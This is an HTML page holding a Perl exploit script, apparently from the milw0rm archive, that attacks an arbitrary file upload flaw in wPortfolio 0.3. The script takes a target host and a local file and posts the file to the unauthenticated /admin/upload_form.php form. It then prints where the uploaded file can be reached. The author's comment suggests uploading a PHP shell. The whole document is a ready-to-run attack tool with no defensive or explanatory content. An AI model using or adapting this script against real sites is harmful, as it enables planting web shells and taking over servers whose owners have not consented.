<html><head><title>wPortfolio <= 0.3 Remote Arbitrary File Upload Exploit</title></head><pre>#!/usr/bin/perl

# Name: wPortfolio &lt;= 0.3 Arbitrary File Upload Exploit
# Script Name: wPortfolio 0.3
# Download: http://sourceforge.net/project/downloading.php?group_id=244834&amp;use_mirror=kent&amp;filename=wPortfolio.zip&amp;80791070
# Vulnerability: Arbitrary File Upload
# Vulnerable page: /admin/upload_form.php
# * You can upload everything you want, why not a php shell? ^^
# Author: Osirys
# Contact: osirys[at]live[dot]it
# Proud to be Italian 
# Thx: athos

use LWP::UserAgent;
use HTTP::Request::Common;

my $path        = &quot;/admin/upload_form.php&quot;;
my $d_fold      = &quot;/admin/tmp/&quot;; 
my($host,$file) = ($ARGV[0],$ARGV[1]);

($host,$file) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;
my $url = $host.$path;

my $ua = LWP::UserAgent-&gt;new;
my $re = $ua-&gt;request(POST $url,
                      Content_Type =&gt; 'form-data',
                      Content      =&gt; [file_to_upload =&gt; [$file]] 
                      );

if ($re-&gt;is_success) {
    print &quot;[+] Uploaded ! \n&quot;;
    print &quot;[+] Link: &quot;.$host.$d_fold.$file.&quot; \n&quot;;
}
else {
    print &quot;[-] Upload failed ! \n&quot;;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub banner {
    print &quot;\n&quot;.
          &quot;  ========================================== \n&quot;.
          &quot;     wPortfolio 0.3 Arbitrary File Upload \n&quot;.
          &quot;     Author: Osirys \n&quot;.
          &quot;     osirys[at]live[dot]it \n&quot;.
          &quot;     Proud to be italian \n&quot;.
          &quot;  ========================================== \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Cheek that you typed the hostname address and the local file to upload !\n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path local_file_to_upload \n\n&quot;;
    exit(0);
}

# milw0rm.com [2008-11-19]</pre></html>